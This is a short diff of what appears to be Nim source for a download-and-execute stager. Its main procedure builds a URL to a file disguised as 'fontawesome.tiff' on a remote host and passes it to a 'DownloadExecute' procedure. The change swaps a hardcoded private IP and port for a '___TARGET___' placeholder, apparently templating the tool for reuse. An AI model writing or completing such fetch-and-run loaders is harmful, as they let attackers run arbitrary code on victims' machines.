@@ -22,7 +22,7 @@ proc DownloadExecute(url: string): void =
   f()
 
 proc main() =
-  let domain = "192.168.122.227:8081"
+  let domain = "___TARGET___"
   let url = fmt"https://{domain}/fontawesome.tiff"
   DownloadExecute(url)
 
